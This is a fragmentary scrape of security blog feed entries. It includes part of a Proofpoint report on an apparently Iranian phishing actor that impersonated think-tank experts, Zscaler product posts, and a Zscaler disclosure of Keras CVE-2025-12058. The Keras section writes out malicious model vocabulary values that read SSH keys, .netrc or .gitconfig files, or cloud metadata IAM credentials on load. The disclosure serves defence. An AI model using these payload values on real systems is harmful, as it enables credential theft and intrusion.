expertise, UNK_SmudgedSerpent leveraged the same collaboration lure about impending Iranian societal reform.&nbsp;\n\nThe attackers\u2019 approach impersonated Suzanne Maloney \u2013 the vice president and director of the Foreign Policy program at the Brookings Institution and an expert on Iran \u2013 using a Gmail address and misspelled version of her name, \u201cSuzzane Maloney.\u201d&nbsp;\n\n\n\nFigure 2. UNK_SmudgedSerpent initial approach.&nbsp;\n\nFollowing a response, the Suzzane Maloney persona was more cautious than Proofpoint has observed in past interactions with TA453. The attacker insisted on verifying the identity of the target and authenticity of the email address before proceeding with any collaboration attempts.&nbsp;\n\n\n\nFigure 3. UNK_SmudgedSerpent follow-up email.&nbsp;\n\nAs the engagement continued, the persona sent an appointed time for a meeting, using Israel time as a point of reference though the target was based in the US. At the delivery stage, the actor began to deviate from TA453\u2019s typical TTPs and sent a link appearing to be an OnlyOffice URL belonging to \"Suzzane Maloney\u201d (again spelled incorrectly) with documents relevant to the upcoming meeting.&nbsp;\n\n\n\nFigure 4. UNK_SmudgedSerpent URL delivery.&nbsp;\n\nTransition to TA455&nbsp;\n\nThe URL was only masquerading as an OnlyOffice link in the email but instead hyperlinked to a health-themed attacker domain&nbsp;thebesthomehealth[.]com, which redirected to a second health-themed attacker domain mosaichealthsolutions[.]com that displayed a Microsoft 365 login page. The URL hosted a customized credential harvesting page with the user\u2019s information pre-loaded.&nbsp;\n\n&nbsp;&nbsp;\n\nFigure 5. Customized Microsoft credential harvesting page.&nbsp;\n\nDelivery variation&nbsp;\n\nAnother version of this infection chain can be found on VirusTotal, where both domains were similarly used in a Microsoft-related redirection chain. hxxps://thebesthomehealth[.]com/[redacted15characterstring] masqueraded as a Microsoft Teams login before redirecting to the&nbsp; mosaichealthsolutions[.]com domain.&nbsp;&nbsp;\n\n\n\nFigure 6. Microsoft Teams meeting spoof (VirusTotal).&nbsp;\n\nHowever, the next stages following clicking the \u201cJoin Now\u201d button are unclear at the time of writing.&nbsp;\n\nTA455 continued&nbsp;\n\nIn Proofpoint\u2019s investigation, after the target communicated suspicions about the credential harvesting page, UNK_SmudgedSerpent removed the password requirement on the initial thebesthomehealth[.]com URL. The link then proceeded to a spoofed OnlyOffice login page.&nbsp;\n\n\n\nFigure 7. UNK_SmudgedSerpent OnlyOffice login spoof.&nbsp;\n\nClicking on \u201cContinue\u201d or login loads another page also hosted on thebesthomehealth[.]com, which continues to resemble OnlyOffice and hosted two PDFs, an Excel document, and a ZIP archive.&nbsp;\n\n\n\nFigure 8. Files hosted on thebesthomehealth[.]com.&nbsp;\n\nUNK_SmudgedSerpent\u2019s reference to OnlyOffice URLs and health-themed domains is reminiscent of TA455 activity. TA455 began registering health-related domains at least since October 2024 following a consistent stream of domains with aerospace interest, with OnlyOffice becoming popular to host files more recently in June 2025, as shown by the timeline below.&nbsp;\n\n\n\nFigure 9. TA455 Domain Registration / First Seen Timeline (May 2024 \u2013 July 2025).&nbsp;\n\nUNK_SmudgedSerpent domains began appearing in April 2025, several weeks before the first campaign was observed in June.&nbsp;\n\nCompleting the chain with TA450&nbsp;\n\nUpon execution, UNK_SmudgedSerpent\u2019s ZIP archive loaded an MSI file, which launched the PDQConnect Remote Monitoring &amp; Management (RMM) software. The rest of the documents appeared to be decoys.&nbsp;\n\nDuring our research, Threat Research observed UNK_SmudgedSerpent engaging in suspected hands-on-keyboard activity where the attackers leveraged PDQConnect to install additional RMM software, ISL Online.&nbsp;\n\n\n\nFigure 10. ISL Online RMM pop-up.&nbsp;\n\nThe reason for the attackers' sequential deployment of two distinct RMM tools remains unclear. It is possible UNK_SmudgedSerpent may have deployed RMM software as a throwaway option after the credential harvesting attempt didn\u2019t succeed, and the threat actor became suspicious of Proofpoint\u2019s investigation. However, neither hypothesis can be confirmed at the time of writing.&nbsp;\n\nWhile the use of RMMs is a generic technique abusing common legitimate tools, it is rare to see them associated with state-sponsored actors and have been documented in use by only one Iranian actor, in TA450 campaigns over the last several years.&nbsp;\n\nFollow-on activity&nbsp;\n\nBefore the email exchange discussed ended on 26 June, Proofpoint identified an additional Gmail account on 23 June spoofing Dr. Maloney (with her name spelled correctly) \u2013 suzannemaloney68@gmail[.]com \u2013 targeting a US-based academic that appeared to be Israeli. In this lure, UNK_SmudgedSerpent asked for assistance investigating the IRGC.&nbsp;\n\n\n\nFigure 11. Second UNK_SmudgedSerpent phishing email.&nbsp;\n\nA different persona, one spoofing Patrick Clawson \u2013 a Director at the Washington Institute \u2013 used the exact same content one week later to target the same academic using patrickclawson51@gmail[.]com.&nbsp;\n\nIn early August 2025, UNK_SmudgedSerpent surfaced again, this time soliciting information and collaboration on Iran\u2019s efforts in Latin America. The phishing email originated from another spoof of Patrick Clawson, this time using an Outlook email address: patrick.clawson51@outlook[.]com. However, the email in the signature did not match and included both potentially legitimate emails and patrickclawson51@gmail[.]com, which was the previously used spoofed email.&nbsp;\n\n\n\nFigure 12. UNK_SmudgedSerpent Patrick Clawson Spoof #2.&nbsp;\n\nThe timeline below shows the campaigns and cadence of UNK_SmudgedSerpent activity, which appears to be topical and sporadic. After the initial approach that targeted over 20 individuals, Proofpoint data showed the actor focused only on solitary targets in further campaigns.&nbsp;\n\n\n\nFigure 13. UNK_SmudgedSerpent phishing activity timeline.&nbsp;\n\nSince early August, no further activity has been observed from this actor.&nbsp;\n\nInfrastructure&nbsp;\n\nInvestigating suspected UNK_SmudgedSerpent infrastructure, such as healthcrescent[.]com, surfaced additional activity that further complicates UNK_SmudgedSerpent\u2019s relationship and overlaps with TA455.&nbsp;\n\nhealthcrescent[.]com shares server configuration similarities with a set of domains, including&nbsp; ebixcareers[.]com, that displays a fake Teams portal. The career-themed domain and Teams spoof are both reminiscent of previous TA455 activity.&nbsp;\n\n\n\nFigure 14. Fake Teams portal landing page.&nbsp;\n\nRelated URLs resembled previously seen activity from TA453, using \u201cmeeting\u201d themes.&nbsp; hxxps://interview.ebixcareers[.]com/teams/join-online-room-homv-patm-elro/ fetched a payload from the following OnlyOffice URL:&nbsp;\n\nhxxps://docspace-mpv1y2.onlyoffice[.]com/rooms/share?key=ZXVSTEhNKzM3NHBIeHg3R3M4cnBRcDFDUnk0b[\u2026]0_Ijg4YzkzZTRhLWNmYzktNGJkMy1iYzYyLWY2NWY0OTczNTBlZCI\n\n&nbsp;\n\n\n\nFigure 15. Files Hosted on OnlyOffice URL.&nbsp;\n\nFiles hosted on this page in mid-September included benign recruitment-related PDFs for Boeing, a traditional aspect of TA455\u2019s operations involving both aerospace and career-themed interests.&nbsp;\n\n\n\nFigure 16. Benign PDFs.&nbsp;\n\nHiring Portal.zip contained two DLLs and an executable; the legitimate EXE sideloads userenv.dlland through another legitimate EXE, sideloads xmllite.exe. userenv.dll is a TA455 custom backdoor termed MiniJunk in public reporting, a version of previously reported malware called MiniBike. While the infrastructure likely aligns with UNK_SmudgedSerpent, it remains unclear why it is simultaneously hosting TA455 custom malware.&nbsp;\n\nThe final file hosted on the OnlyOffice URL was Interview time.msi, a loader responsible for installing the RMM tool PDQConnect, seen deployed in both UNK_SmudgedSerpent and TA450 activity, though not previously seen associated with TA455.&nbsp;\n\nThe exploration of infrastructure and operations connected to UNK_SmudgedSerpent activity further blurs the lines of attribution and the nature of the relationship to TA455.&nbsp;\n\nAttribution&nbsp;\n\nProofpoint Threat Research is currently tracking this activity separately as a new threat actor \u2013 UNK_SmudgedSerpent \u2013 and clustered distinctly from TA453, TA455, and TA450. While there are several overlaps with established threat actors in various stages of the infection chain, which are shown below, they remain tenuous in some cases without high confidence links.&nbsp;\n\n\n\t\n\t\t\n\t\t\t\n\t\t\tTTP&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tUNK_SmudgedSerpent&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tTA453&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tTA455&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tTA450&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tSender emails&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tFreemail (Outlook, Gmail)&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tFreemail (Outlook, Gmail, ProtonMail, Yahoo)&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tAttacker-owned domains&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCompromised corporate accounts&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tInitial approach&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tBenign conversation&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tBenign conversation&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tMalicious recruitment applications&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tMalicious event invitations&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tTargeting&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tPolicy experts, thinktanks&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tPolicy experts, thinktanks&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tAerospace and defense, transportation/logistics, technology&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tGovernment, telecommunications, transportation&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tDelivery&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tOnlyOffice spoof, Teams spoof&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tTeams spoof, Scalingo, OneDrive&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tOnlyOffice&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tMega.nz, FliQR&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tObjective&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCredential theft, malware delivery&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCredential theft, malware delivery&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tMalware delivery&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tMalware delivery&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tDomain themes&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tHealth and recruitment, organization spoofs&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tOrganization, meeting, Google, Microsoft, and technology spoofs&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tHealth, aerospace, and recruitment&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tTechnology, other&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tInfrastructure&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCloudflare, Namecheap&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tHetzner, OVH, RouterHosting, Namecheap&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCloudflare, Namecheap&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tNordVPN, Cloudflare Namecheap&nbsp;\n\t\t\t\n\t\t\n\t\t\n\t\t\t\n\t\t\tMalware&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tRMM (PDQConnect)&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tPowerShell backdoors (occasional)&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tCustom backdoors (MiniJunk, MINIBIKE, MINIBUS)&nbsp;\n\t\t\t\n\t\t\t\n\t\t\tRMMs, custom PowerShell and .NET backdoors (Phoenix)&nbsp;\n\t\t\t\n\t\t\n\t\n\n\n&nbsp;\n\nGiven the dynamic nature of the Iranian ecosystem and its heavy use of contracting companies, there are often instances where groups, activity, malware, and infrastructure intersect. We hypothesize there are several possibilities for the group\u2019s convergence of TTPs with varying degrees of likelihood, which include:&nbsp;\n\n\n\tCentralized procurement: a shared resource that registers and distributes infrastructure or a shared malware developer.&nbsp;\n\tPersonnel mobility: one group dissolves, and another absorbs team members, or groups merge based on new requirements or shared remits.&nbsp;\n\tInterpersonal relationships: individual members of the same team have TTP preferences, and operators share their preferred techniques with one another.&nbsp;\n\tParallel contractor deployment: the parent/sponsoring agency tasks more than one contracting company to a particular threat group or campaign.&nbsp;\n\tInstitutional collaboration: cross-agency exchanges between IRGC and MOIS at an organizational level due to the groups\u2019 affiliations with differing agencies.&nbsp;\n\n\nConclusion&nbsp;\n\nUNK_SmudgedSerpent\u2019s first observed campaign was in June 2025, after which the group was seen a few times targeting policy experts in the US using lures about internal political developments in Iran. The subsequent investigation revealed multiple overlaps in TTPs with TA453, TA450, and TA455. However, the abundance of links prevents high confidence attribution to any one of these groups.&nbsp;\n\nWhile UNK_SmudgedSerpent has not been observed in email campaigns since August 2025, related activity likely remains ongoing. The appearance of a new actor with borrowed techniques suggests there may be personnel mobility or exchange between teams, but with a consistent remit; however, there is no confirmed attribution for UNK_SmudgedSerpent at the time of writing. The TTPs and infrastructure are an extension of previously observed behavior from Iranian threat groups, and the targeting of Iran foreign policy experts continues to reflect the Iranian government\u2019s intelligence collection priorities.&nbsp;\n\nET rules&nbsp;\n\n\n2054935 - ET INFO PDQ Remote Management HTTP Header Observed (x-pdq-key-ids)&nbsp;\n\n2054936 - ET INFO PDQ Remote

      "link": "https://www.zscaler.com/blogs/product-insights/zero-trust-cloud-architects-turning-spring4shell-lessons-resilient-workload",
      "summary": "In today\u2019s fast-paced digital world, cloud architects face growing challenges in managing and securing distributed workloads. Microservices and APIs are crucial for innovation\u2014but they also open the door to growing complexity, misconfigurations, and potential vulnerabilities. The recent Spring4Shell and Spring Cloud Function vulnerabilities underscore how exposed control planes and implicit trust can lead to devastating consequences for businesses.&nbsp;Firewall-based legacy architectures are no longer enough\u2014providing inconsistent threat protection, expanded attack surfaces, and overwhelming operational complexity. Modern environments demand a simplified but powerful approach:&nbsp;Zero Trust. This is where&nbsp;Zscaler Zero Trust Cloud delivers, empowering organizations to succeed with scalable, streamlined, and secure cloud workload operations.&nbsp;What Spring4Shell Taught Us: Modern Innovation Requires Modern ProtectionThe&nbsp;Spring4Shell (CVE-2022-22965) and&nbsp;Spring Cloud Function (CVE-2022-22963) vulnerabilities exemplify challenges faced by modern developers and cloud architects. These widely-used frameworks, integral to cloud-native architectures, were exploited by attackers to execute remote code, expose inner workings of services, and facilitate malicious actions.Why this matters:Expanded attack surfaces: Resources like APIs, management endpoints, and routing headers must be accessible for functionality\u2014but when these are exposed without proper security, they enable attackers to easily exploit weaknesses.Complexity vs. scalability: Distributed microservices and multi-cloud architectures exacerbate the challenge of applying consistent security postures across workloads while maintaining velocity in delivery.Legacy overwhelm: Firewall-based segmentation and static policies struggle to keep pace with dynamic cloud workloads, leaving architectures vulnerable.While patches for Spring vulnerabilities have been made available, architectural weaknesses\u2014like exposed management planes and permissive trust relationships\u2014persist. These vulnerabilities aren\u2019t just about patching your systems; they reveal the need for an adaptable, zero-trust approach to architecting secure, scalable workloads.For a detailed breakdown of the vulnerabilities and exploitation methods, see the ThreatLabz full blog post here.&nbsp;Enter Zscaler Zero Trust Cloud: Secure Workloads with ConfidenceZscaler Zero Trust Cloud redefines how security is applied to cloud workloads\u2014adopting a zero-trust framework to secure, segment, and connect critical applications across public clouds. By leveraging the&nbsp;Zero Trust Exchange\u2122 platform, organizations can achieve:Simplified operations: Eliminate fragmented security tools and policies while accelerating workload delivery.Integrated security: Shift away from traditional firewalls and embrace end-to-end workload protection across all cloud services.Active threat defense: Ensure consistent safeguards against cyberattacks, leveraging Zscaler\u2019s cloud-delivered intelligence and global scale.With&nbsp;Zero Trust Cloud, cloud architects can:Eliminate lateral threat movement through precise, zero-trust segmentation at the application and workload layer.Enhance operational efficiency by decoupling dependency on legacy appliances like firewalls and VPNs.Strengthen protection against cyberattacks while safeguarding sensitive data across workloads.Zero Trust Cloud offers two flexible deployment options:Virtual Machine (VM): Managed by the customer.Zero Trust Gateway: Fully managed by Zscaler for a hands-off, simplified security model.&nbsp;How Zero Trust Cloud Resolves the Risks Highlighted by Spring4ShellTaking lessons from the Spring4Shell incident, it\u2019s clear that a zero-trust approach is critical in securing modern cloud environments. Here\u2019s how&nbsp;Zscaler Zero Trust Cloud prevents the exploitation of vulnerable workloads:Remove exposed management planes:Spring4Shell and Spring Cloud Function vulnerabilities have one common denominator \u2014 the ability for attackers to exploit publicly exposed management endpoints. With Zscaler Private Access (ZPA), organizations can&nbsp;publish management interfaces privately by default with:Identity-based authentication.Zero exposed IP addresses or open inbound ports.Posture assessments to eliminate risky session conditions.Enforce precise workload-to-workload segmentation:Lateral threat movement is minimized when workloads are unable to communicate without authorization. Zero Trust Cloud enables:Application-layer (Layer 7) segmentation for services communicating across clouds, environments, or clusters.Zero trust policies that ensure compromised workloads only have access based on explicit intent.Proactively inspect for exploitation attempts:Spring4Shell attacks used malicious HTTP requests to compromise workloads and deploy second-stage payloads. With&nbsp;Zscaler Internet Access (ZIA), organizations gain:Inline protection using Cloud IPS and WAAP to block known Spring4Shell exploitation patterns.TLS/SSL inspection to detect banished payloads or second-stage malware at scale.Zero-day defense with Advanced Threat Protection and sandboxing to prevent unknown malware.Restrict outbound (egress) traffic at its source:Compromised workloads often attempt to connect to command-and-control (C2) servers or transfer sensitive data outside your environment. With Zero Trust Cloud:All egress traffic is restricted by intent, blocking unknown destinations and anomalous behavior.Policies automatically adapt to new environments without manual updates.&nbsp;Simplified, Scalable, Secure Cloud WorkloadsThe power of Zscaler Zero Trust Cloud lies in its ability to simplify security while enabling innovation. By decoupling from legacy approaches like firewalls and VPNs, cloud architects empower their organizations with:Faster workload delivery: Securely connect operations across containers, serverless functions, and multi-cloud without service delays.Unified policy enforcement: Ensure consistent protections regardless of workload location or cloud architecture.Advanced visibility and insight: Monitor workload communications, detect threats, and respond to incidents faster with integrated visibility.By focusing on&nbsp;securing connections, not networks, Zscaler\u2019s Zero Trust Cloud brings enterprises closer to achieving their digital transformation goals without compromise.&nbsp;Why Cloud Architects Should Prioritize Zero Trust NowSpring4Shell and similar threats serve as a wake-up call\u2014security must evolve alongside your workloads. While vulnerabilities may expose weaknesses, modern architectures should ensure they&nbsp;minimize risk, control blast radius, and protect critical systems by design.With&nbsp;Zscaler Zero Trust Cloud, cloud architects gain a future-proof strategy to secure their workloads in a consistent, scalable way. Whether you're managing Kubernetes environments, serverless functions, or traditional applications, Zscaler aligns security with the needs of today\u2019s distributed, cloud-forward enterprises.&nbsp;Learn More: Transform Cloud Security with Zero Trust CloudJoin us for the&nbsp;Zscaler Zero Trust Cloud launch event to discover actionable strategies to secure cloud workloads:Learn how Zero Trust Cloud prevents vulnerabilities like Spring4Shell from becoming major incidents.Explore architectural approaches to protect management planes, enforce workload segmentation, and eliminate lateral risk.Watch live demos and hear insights from Zscaler experts.Secure your spot now: Register&nbsp;here.&nbsp;For a deeper dive into Spring vulnerabilities and their potential impacts, visit the&nbsp;Zscaler ThreatLabz Blog.",

      "title": "Announcing Major Enhancements to Business Continuity Cloud for ZPA: Deploy Faster, Test with Confidence, and Operate with Ease",
      "link": "https://www.zscaler.com/blogs/product-insights/announcing-major-enhancements-business-continuity-cloud-zpa-deploy-faster",
      "summary": "For any organization, having a disaster recovery plan is standard practice. As part of all our cloud services, Zscaler offers high resiliency to withstand outages as a result of a component failure, a blackout, or a brownout. However, in case of critical failures caused by black swan events like undersea cable cuts, we find that our customers endeavor to keep the operational readiness and security efficacy with 3rd party solutions like a VPN or a network firewall. Even with this&nbsp; plan, the key challenges remain: Can you failover automatically? Autonomously? Can you keep consistent security policies? Can you deliver the same level of security, and user experience during these critical failures? And can you prove compliance at every step?To address these challenges, Zscaler offers its Business Continuity Cloud offering for both ZIA and ZPA. Several of our large and enterprise customers have adopted the solution\u2014whether choosing the Zscaler-managed or customer-hosted option\u2014and are already seeing significant value.&nbsp;&nbsp;Building on that momentum, we're announcing major enhancements across four key areas to Business Continuity Cloud for ZPA: simplifying deployment, readiness testing, component hardening and streamlining Day 2 operations.1. Effortless Deployment: Get Production-Ready in Record TimeWe are making it faster and easier to deploy customer-hosted business continuity solution.Deploy Faster with Prebuilt ImagesUse ready-to-deploy images for AWS, Azure, and VMware (.ova), drastically accelerating your deployment.Use Your Existing Identity ProviderIntegrate with your existing Okta and Entra ID configurations. This eliminates redundant IDPs for DR, ensuring a consistent authentication experience for users during Business Continuity mode.Maintain Performance and Compliance with PSE RedirectionBusiness Continuity now honors your existing Private Service Edge (PSE) redirection policies, ensuring users are always routed to the configured PSE for performance and compliance, even during a failover event. This is critical for organizations that need to comply with regional geo fencing mandates.2. Ensure Readiness With Confidence: Test and Validate Your Plan ContinuouslyNow, you can validate your setup with granular control and minimal risk.Toggle based Trigger for Private InfrastructureThrough a simple toggle in the ZPA portal, administrators can now force specific components (App Connectors, Private Service Edges and Private Cloud Controllers) into Business Continuity mode. This is ideal for running scheduled drills, training your operations teams, and satisfying auditors who require proof of readiness.DNS Based Trigger for UsersTest before you deploy. With DNS-driven activation, you can now pilot Business Continuity mode with a select group of users to confirm your configuration is working correctly. Once validated, you can roll it out across your entire organization. The DNS-driven switchover also gives you manual override control to switch all users into business continuity whenever necessary.With this approach, you can:a. Test Business Continuity with specific user groups before rolling it out organization-wide, &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;reducing risk and validating your configuration.b. Maintain continuous validation by always sending a percentage of your users through the &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Business Continuity infrastructure to ensure the solution works as expected.c. Manual override for failover by forcing users into Business Continuity if the automatic mechanism &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; isn't triggered.d. Meet compliance requirements by forcing users into Business Continuity every 3-6 months for &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mandatory compliance testing.3. Component Hardening: Secure Your Business Continuity EnvironmentYour business continuity environment requires the same robust security as your primary production setup. We've added two critical layers to harden the solution.Configuration Backup and Restore&nbsp;You can now easily back up and restore your Private Cloud Controller configurations, providing an essential safeguard against data loss and simplifying recovery procedures.Database EncryptionAll Business Continuity databases are now encrypted by default, protecting your configuration data from unauthorized access.4. Streamlined Day 2 Operations: Simplify Management and TroubleshootingFor customers that have deployed the on-premises self-hosted option, we've simplified Day 2 management and troubleshooting with new tools.Enhanced Debuggability&nbsp;New commands allow administrators to quickly review Business Continuity configuration, status, Private Controller health, and Private Cloud Controller redirections. These diagnostic tools are especially valuable when the ZPA Portal may be unavailable.Stay Informed with Proactive Notifications&nbsp;Receive automatic notifications for critical events, enabling your team to respond faster and manage the environment proactively.Remote Support InformationAdministrators can now run commands on Private Cloud Controllers directly through the ZPA Admin Portal, eliminating the need for manual SSH login. This capability significantly speeds up troubleshooting and reduces operational overhead.&nbsp;&nbsp;Looking AheadThese enhancements represent our commitment to making&nbsp;Business Continuity Cloud for ZPA not just a failover solution, but a compliant, testable, and enterprise-grade business continuity solution. Whether you're setting up Business Continuity Cloud for the first time or looking to upgrade from your existing ZPA Disaster Recovery implementation, these updates provide the tools and flexibility to ensure continuous, secure access to your applications. And we're not stopping here\u2014with dedicated dashboards and more coming soon, we are committed to making sure your business is always on and always secure, no matter what.Ready to move from planning to true operational readiness?

      "link": "https://www.zscaler.com/blogs/security-research/zscaler-discovers-vulnerability-keras-models-allowing-arbitrary-file-access",
      "summary": "SummaryZscaler uncovered a vulnerability in Keras that exposed AI and machine learning environments to file access and network exploitation risks, highlighting the urgent need to secure the AI model supply chain. Through responsible disclosure and ongoing research, Zscaler helps enterprises stay protected from emerging AI threats with a Zero Trust approach.&nbsp;Key TakeawaysTechnical analysis of CVE-2025-12058. The Keras model vulnerability root cause analysis, attack vectors, and disclosure details.AI models increasingly introduce new security risks. Even trusted frameworks can contain flaws that expose data or systems and become attack vectors.Research and disclosure make AI safer. Transparent information sharing of CVEs and other key discoveries is a critical safety component across the open-source and security communities.Securing the AI supply chain is essential. Enterprises must verify the integrity of models, code, and data sources to prevent compromise through AI.Zero Trust principles extend to AI. The same verification principles that protect users and apps also apply to AI.Zscaler is leading in AI security. Our research and technology help organizations embrace transformation and use AI safely.&nbsp;Overview&nbsp;Keras Model - Arbitrary File Access and Server-Side Request ForgeryZscaler identified a vulnerability in Keras 3.11.3 and earlier that allows arbitrary file access and potential Server-Side Request Forgery (SSRF) when loading malicious .keras model files.The flaw exists in the StringLookup and IndexLookup preprocessing layers, which permit file paths or URLs in their vocabulary parameter. When loading a serialized model (.keras file), Keras reconstructs these layers and accesses the referenced paths during deserialization - even with safe_mode=True enabled.This behavior bypasses user expectations of \"safe\" deserialization and can lead to:Arbitrary local file read (e.g., /etc/passwd, SSH keys, credentials)Server-Side Request Forgery (SSRF) when network schemes are supportedInformation disclosure via vocabulary exfiltrationZscaler responsibly disclosed the issue to the Keras development team. The vulnerability is tracked as CVE-2025-12058 with a CVSS score of 5.9 (Medium) and was fixed in Keras version 3.11.4.Technical Analysis of CVE-2025-12058The vulnerability stems from how Keras handles model reconstruction during loading. Preprocessing layers (StringLookup and IndexLookup) allow file paths or URLs to be passed as input to define their vocabularies. When a .keras model is deserialized, these paths are automatically opened and read by TensorFlow\u2019s file I/O system without proper validation or restriction. This means that even when security features like safe_mode are enabled, a malicious model can still instruct Keras to access local files or external URLs during load time, exposing sensitive data or enabling remote network requests.&nbsp;Affected ComponentsLayers: keras.layers, StringLookup, keras.layers, IndexLookup, potentially IntegerLookupVersions: Keras 3.11.3 (and likely earlier 3.x versions)Backend: Confirmed with TensorFlow backend 2.20.0Default Settings: Reproduces with safe_mode=True, no custom objects requiredRoot CauseThe StringLookup and IndexLookup layers accept a vocabulary parameter that can be either:An inline list/array of tokensA string path to a vocabulary fileDuring model deserialization, if the vocabulary is a string path, Keras uses TensorFlow's tf.io.gfile APIs to read the file. This filesystem API supports:Absolute local paths (e.g., /etc/passwd)file:// URLsNetwork URLs (http://, https://) when TensorFlow-IO is presentCritical Issue: safe_mode=True guards against unsafe callable deserialization but does not restrict I/O operations performed by built-in layers during reconstruction.Real-World Impact ScenariosML Model Hub CompromiseAttackers upload a malicious .keras model to a public repository (e.g., Hugging Face, Kaggle).When a victim downloads and loads the model, SSH private keys or local configuration files may be exposed.Attack vector:Attacker uploads a malicious .keras model file to the public repositoryThe model's StringLookup layer is configured with vocabulary=\"/home/victim/.ssh/id_rsa\"Victim downloads and loads the model for evaluation or fine-tuningSSH private key contents are read into the model's vocabulary during deserializationAttacker retrieves the key by re-downloading the model or through vocabulary exfiltrationPotential impact: complete compromise of victim's SSH access to servers, code repositories, and cloud infrastructure. Attackers can pivot to active intrusion: clone private repos, inject backdoors or malicious commits into CI/CD, execute code in production, and move laterally.Cloud Credential TheftML engineers deploying models in AWS/GCP/Azure environments with instance metadata services. Malicious model references metadata endpoints (e.g., http://169.254.169.254/) so loading it in a cloud VM/container returns IAM credentials.Attack vector:Attacker crafts a model with vocabulary=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\"Model is loaded in a cloud VM or container with IAM role attachedAWS credentials (access key, secret key, session token) are fetched at load timeCredentials populate the vocabulary and can be exfiltrated via get_vocabulary()Potential impact: Full access to cloud resources under the compromised role. Attackers can take over infrastructure, exfiltrate data, deploy ransomware or crypto mining, erase logs, and pivot access across accounts.&nbsp;Supply Chain Attack via Pre-trained ModelsAttacker publishes or poisons a popular pre-trained model that references local credential files (.gitconfig, .netrc) so CI/CD or developer machines leak tokens when the model is loaded. Development teams using third-party pre-trained models for transfer learning may import these models and expose Git tokens, API keys, and source code.Attack vector:Attacker compromises a popular pre-trained model repository or creates a malicious \"state-of-the-art\" modelModel contains StringLookup with vocabulary=\"file:///home/developer/.gitconfig\" or \"file:///home/developer/.netrc\"Developers load the model in CI/CD pipelines or local development environmentsGit credentials, authentication tokens, and repository access details are extractedAttacker gains access to private source code repositoriesPotential impact: Stolen dev credentials enable source code/IP theft and insertion of malicious code and backdoors into builds and signed artifacts. Backdoor releases can propagate downstream to customers and partners, triggering widespread compromise.How Zscaler Discovered CVE-2025-12058This vulnerability was discovered during Zscaler's ongoing security research into AI/ML framework security and model supply chain risks. While analyzing Keras preprocessing layers, researchers observed that certain deserialization routines allowed file operations to execute before security controls were applied. Further analysis revealed that TensorFlow\u2019s file handling APIs could access both local and remote resources through path references embedded in model files. This discovery highlights how even seemingly safe model loading mechanisms can expose enterprise systems to data exfiltration or SSRF attacks when handling untrusted AI models. &nbsp;Discovery: Investigation of the StringLookup and IndexLookup layers accept a vocabulary parameter that can be either an inline list or a file path.Deep inspection of the deserialization code revealed that:File paths in the vocabulary parameter are resolved using TensorFlow's tf.io.gfile API during model loading.This file access occurs before any safe_mode checks on custom objects.The API supports not just local paths but also file:// URLs and network schemes.As enterprises increasingly adopt AI/ML technologies, Zscaler remains dedicated to identifying and mitigating security risks before they can be exploited in production environments.Detection and Prevention with Zscaler AI Security Posture Management (AISPM)Zscaler\u2019s AI Security Posture Management (AISPM) solution provides protection against malicious or compromised AI models before deployment.

      "link": "https://www.zscaler.com/blogs/product-insights/zero-trust-campus-here-guide-securing-future-higher-education-it",
